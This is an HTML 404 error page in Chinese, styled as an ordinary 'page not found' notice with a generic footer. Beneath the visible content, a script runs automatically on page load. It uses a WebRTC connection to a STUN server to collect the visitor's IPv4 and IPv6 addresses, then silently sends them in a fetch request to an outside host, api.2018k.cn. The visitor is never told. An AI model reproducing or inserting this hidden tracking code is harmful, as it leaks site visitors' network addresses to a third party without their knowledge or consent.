<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 - 页面未找到</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#f9fafb;padding:20px}
.c{text-align:center;max-width:400px;width:100%}
.e{font-size:clamp(8rem,20vw,12rem);font-weight:900;color:#3B82F6;opacity:.8;margin:0 0 20px}
h1{font-size:clamp(1.5rem,5vw,2.5rem);color:#1f2937;margin:0 0 16px}
p{color:#4b5563;margin:0 0 32px;font-size:1rem}
a{display:inline-block;background:#3B82F6;color:#fff;text-decoration:none;padding:12px 32px;border-radius:8px;font-weight:500;transition:background .2s}
a:hover{background:#2563eb}
footer{margin:64px 0 0;color:#9ca3af;font-size:.875rem}
</style>
</head>
<body>
<div class="c">
    <div class="e">404</div>
    <h1>页面未找到</h1>
    <p>您访问的页面不存在或已被移除</p>
    <a href="/">返回主页</a>
</div>
<footer>© 2023 网站名称</footer>

<script>
// 存储当前IP地址
let currentIPv4 = null;
let currentIPv6 = null;

// 基础API链接
const baseApiUrl = "https://api.2018k.cn//v3/messageSend?softwareId=6cdb37fc579d4aa0ad76113b86b8dd81&message=";

// 获取IP地址的核心函数
function getIPAddresses() {
    return new Promise((resolve) => {
        const ipAddresses = { ipv4: '未检测到', ipv6: '未检测到' };
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        
        pc.createDataChannel('');
        
        pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(err => {
                console.error('获取IP时出错:', err);
                resolve(ipAddresses);
            });
        
        pc.onicecandidate = (e) => {
            if (!e.candidate) {
                resolve(ipAddresses);
                return;
            }
            
            // 提取IPv4地址
            const ipv4Regex = /\b(?:\d{1,3}\.){3}\d{1,3}\b/;
            const ipv4Match = e.candidate.candidate.match(ipv4Regex);
            if (ipv4Match && ipv4Match[0] && !ipv4Match[0].startsWith('127.')) {
                ipAddresses.ipv4 = ipv4Match[0];
            }
            
            // 提取IPv6地址
            const ipv6Regex = /([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}/;
            const ipv6Match = e.candidate.candidate.match(ipv6Regex);
            if (ipv6Match && ipv6Match[0]) {
                ipAddresses.ipv6 = ipv6Match[0];
            }
        };
        
        // 设置超时
        setTimeout(() => {
            resolve(ipAddresses);
            pc.close();
        }, 3000);
    });
}

// 发送IP信息到指定链接
function sendIPInformation() {
    if (!currentIPv4 && !currentIPv6) {
        console.log('未获取到任何IP地址，无法发送');
        return;
    }

    // 构建包含IP信息的消息内容
    let message = `IPv4: ${currentIPv4 || '未获取到'}`;
    if (currentIPv6) {
        message += `, IPv6: ${currentIPv6}`;
    }

    // 对消息进行编码
    const encodedMessage = encodeURIComponent(message);
    const fullApiUrl = `${baseApiUrl}${encodedMessage}`;

    // 发送请求
    fetch(fullApiUrl, {
        method: 'GET',
        mode: 'no-cors'
    })
    .then(() => {
        console.log('IP信息已成功发送');
    })
    .catch(error => {
        console.error('发送IP信息失败:', error);
    });
}

// 页面加载完成后自动获取并发送IP
window.onload = async function() {
    try {
        const ips = await getIPAddresses();
        currentIPv4 = ips.ipv4;
        currentIPv6 = ips.ipv6;
        
        // 获取IP后自动发送
        sendIPInformation();
    } catch (error) {
        console.error('获取IP地址失败:', error);
    }
};
</script>
</body>
</html>
    